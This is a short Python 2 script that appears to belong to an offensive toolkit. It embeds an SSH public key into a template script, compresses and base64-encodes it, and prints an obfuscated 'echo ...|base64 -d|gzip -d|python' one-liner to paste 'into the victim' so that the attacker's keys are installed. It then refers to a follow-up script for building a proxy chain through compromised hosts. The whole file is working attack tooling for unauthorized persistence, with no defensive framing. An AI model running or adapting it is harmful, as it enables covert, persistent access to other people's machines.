
#!/usr/bin/env python

import os
import sys
import base64
import StringIO
import gzip
import re
import tempfile

logging = True

def usage():
    print "usage: %s <ssh public key path>" % sys.argv[0]
    sys.exit(1)

def templify(template, replacements):
    out = template
    for k, v in replacements.iteritems():
        out = out.replace(k, v)
    return out

def gzbase(stuff):
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(nocomments(stuff))
    return base64.b64encode(out.getvalue())

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def nocomments(stuff):
    nc = re.sub('#.*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if not logging and "log" in l:
                continue
            o += l
    return o

def main():
    if len(sys.argv) < 2:
        usage()

    KEYPATH = sys.argv[1]

    print "[*] SSH Key path: %s" % KEYPATH
    
    SCRIPT_TEMPLATE = getfile(os.path.join(sys.path[0], "provision_sketch.py"))
    print "[*] keypath: %s" % KEYPATH
    
    pubkey = base64.b64encode(getfile(KEYPATH))

    replacements = {
        "PUBLIC_KEY_PLACEHOLDER" : pubkey
    }

    SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
    gzbased = gzbase(SCRIPT)
    cmd = "echo '%s'|base64 -d|gzip -d|python" % gzbased
    print "[+] paste the following into the victim as the user to install the keys to"
    print cmd
    f = tempfile.NamedTemporaryFile(delete=False)
    f.write(cmd)
    print "[+] This is also available to you in the file %s" % f.name
    print "[*] Once this commmand is ran on sketch as the user to install the keys to, run install_proxy.py <Proxyport> <Middle> <Edge> <User> <Key>"

if __name__ == "__main__":
    main()
